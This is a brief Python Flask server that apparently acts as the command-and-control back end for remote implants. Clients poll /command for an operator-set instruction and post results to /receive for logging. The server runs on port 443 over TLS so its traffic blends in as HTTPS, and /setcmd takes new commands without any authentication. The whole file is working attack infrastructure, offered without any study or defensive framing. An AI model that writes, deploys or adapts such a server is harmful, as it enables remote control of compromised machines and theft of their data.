from flask import Flask, request, jsonify, render_template
from utils.logger import log_command
import os
import ssl
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/receive', methods=['POST'])
def receive():
    data = request.get_json()
    log_command(data)
    return jsonify({'status': 'received'})

@app.route('/command', methods=['GET'])
def send_command():
    try:
        with open('cmd.txt', 'r') as f:
            cmd = f.read().strip()
        return jsonify({'cmd': cmd})
    except:
        return jsonify({'cmd': ''})

@app.route('/setcmd', methods=['POST'])
def set_command():
    data = request.get_json()
    with open('cmd.txt', 'w') as f:
        f.write(data['cmd'])
    return jsonify({'status': 'command set'})

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=context)
